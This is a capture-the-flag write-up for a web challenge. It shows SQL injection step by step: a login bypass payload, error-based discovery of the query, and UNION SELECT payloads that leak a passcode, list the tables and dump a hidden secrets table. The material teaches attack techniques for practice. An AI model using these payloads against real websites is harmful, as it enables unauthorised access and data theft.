# Database Reincursion

**Category:** Web  
---

## 1. Login Bypass

See login form → test SQLi.

```sql
SELECT * FROM users WHERE user='x' IS NOT 'x' AND password='x' IS NOT 'x'
```

`'x' IS NOT 'x'` = `'x' != 'x'` = FALSE... wait, that's wrong?

Actually: `user='x'` returns FALSE, then `FALSE IS NOT 'x'` = TRUE (comparing boolean to string = always not equal)

**Payload:**
```
Username: x' IS NOT 'x
Password: x' IS NOT 'x
```

---

## 2. Leak Admin Passcode

On `/search`, try single quote `'` to trigger error:

```
SQL error: unrecognized token: "''' ORDER BY id LIMIT 4"
```

**This reveals query structure:**
```sql
SELECT * FROM employees WHERE name = '{input}' ORDER BY id LIMIT 4
```

Now we know:
- Has `ORDER BY id LIMIT 4` at the end
- 5 columns displayed: ID, Name, Department, Email, Notes

**Payload:**
```sql
'UNION SELECT email,notes,1,1,1 FROM employees'
```

**Result:**
```
Kiwi@citadel.com | Passcode: ecSKsN7SES
```
## 3. Find Secret Table

Login `/admin` with passcode. Page shows 2 tables:

**Reports** (4 columns): ID, Quarter, Note, Revenue  
**Metadata Registry** (3 columns): Table Name, Description, Last Update

**Using this payload**
```sql
'UNION SELECT * from metadata'
```

Metadata will displays available tables - one entry shows:
```
CITADEL_ARCHIVE_2077 | secrets | REDACTED
```

Hidden table found! Description says `secrets` → column probably named `secrets`.

---

## 4. Get Flag

The query input affects Reports table (4 columns). To dump `CITADEL_ARCHIVE_2077`:

```sql
'union select secrets,1,1,1 from CITADEL_ARCHIVE_2077--
```

- Reports has 4 columns → UNION needs 4 values
- `secrets` goes to first column, pad rest with `1`
- `--` comments out remaining query

**Result:** `nite{neVeR_9Onn4_57OP_WonDER1N9_1f_175_5ql_oR_5EKWeL}`

